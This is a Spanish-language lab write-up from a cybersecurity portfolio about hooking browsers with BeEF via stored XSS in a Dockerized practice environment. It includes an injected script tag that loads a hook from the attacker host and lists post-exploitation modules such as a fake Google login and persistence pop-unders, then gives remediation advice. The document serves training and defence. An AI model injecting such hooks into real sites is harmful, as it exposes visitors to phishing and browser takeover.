# 🛰️ Lab 04.4: Browser Exploitation Framework (BeEF) 🕸️

**Módulo:** 04 - Ataques de Ingeniería Social  
**Fecha:** 2 de Marzo de 2026  
**Entorno:** Dockerizado (Kali Linux + BeEF vs Pixel Paradise Vuln)  
**Objetivo:** Hooking de navegadores remotos mediante XSS e introducción al control de post-explotación.  

---

## 1. 📂 Preparación del Escenario
El laboratorio consta de dos contenedores principales:
- **Atacante (kali-beef):** `172.32.0.10` ejecutando BeEF.
- **Víctima (pixel-paradise-vuln):** `172.32.0.20` ejecutando un sitio web Apache vulnerable.

### 🚀 Levantando el Laboratorio
Desde la carpeta de infraestructura:
```bash
docker compose up -d
```
> [!NOTE]
> El entorno cuenta con un script de auto-configuración (`setup_beef.sh`) que instala automáticamente las gemas de Ruby y configura los puertos de proxy (6791) para evitar fallos.

---

## 2. 🔐 Acceso al Panel de Control (Command & Control)
Para ver los navegadores "enganchados", accedemos a la interfaz administrativa de BeEF.

- **URL:** [http://localhost:3000/ui/panel](http://localhost:3000/ui/panel)
- **Usuario:** `beef`
- **Contraseña:** `Cisco_Lab_2026!`

---

## 3. 🕸️ Ejecución del Ataque: XSS Hooking
El objetivo es inyectar un pequeño código JavaScript (el "hook") en el sitio vulnerable para que, cuando cualquier usuario lo visite, su navegador se comunique con nuestro servidor BeEF.

### 📝 Inyectando el Hook
1. Accede al sitio vulnerable: [http://localhost:8083](http://localhost:8083)
2. Busca un campo de entrada (p. ej., buzón de sugerencias) e inyecta el siguiente script:
   ```html
   <script src="http://172.32.0.10:3000/hook.js"></script>
   ```
3. Envía el formulario.

---

## 4. 🕹️ Fase de Control y Post-Explotación
Una vez el navegador de la víctima ha ejecutado el script, aparecerá en el panel de BeEF bajo la pestaña **"Online Browsers"**.

### 🛠️ Comandos de Ejemplo
BeEF divide sus módulos en colores según su visibilidad y probabilidad de éxito:
- 🟢 **Verde:** Funciona y es invisible para el usuario.
- 🟠 **Naranja:** Funciona pero puede ser visible.
- ⚪ **Gris:** El comando no se ha probado contra este navegador.
- 🔴 **Rojo:** Comando incompatible.

#### Comandos Recomendados para el Lab:
- **Social Engineering:** `Google Phishing` (crea un login falso de Google en la pestaña actual).
- **Host:** `Get System Info` (extrae detalles del SO y hardware del cliente).
- **Browser:** `Alert Dialog` (el clásico "Hello World" del XSS).
- **Persistence:** `Create Pop-under` (crea una ventana oculta para no perder el hook al cerrar la pestaña).

---

## ⚠️ Análisis de Seguridad y Remediación
El éxito de este ataque se debe a la falta de saneamiento de inputs en el servidor PHP y la carencia de cabeceras CSP.

### ✅ Recomendaciones:
1. **Saneamiento de Inputs:** Usar funciones como `htmlspecialchars()` en PHP para neutralizar etiquetas `<script>`.
2. **Content Security Policy (CSP):** Configurar cabeceras que prohíban la carga de scripts externos no autorizados (`script-src 'self'`).
3. **WAF (Web Application Firewall):** Implementar reglas que detecten patrones de inyección JavaScript.

---
*Documento generado por Michel Macias para su Portfolio de Ciberseguridad.*
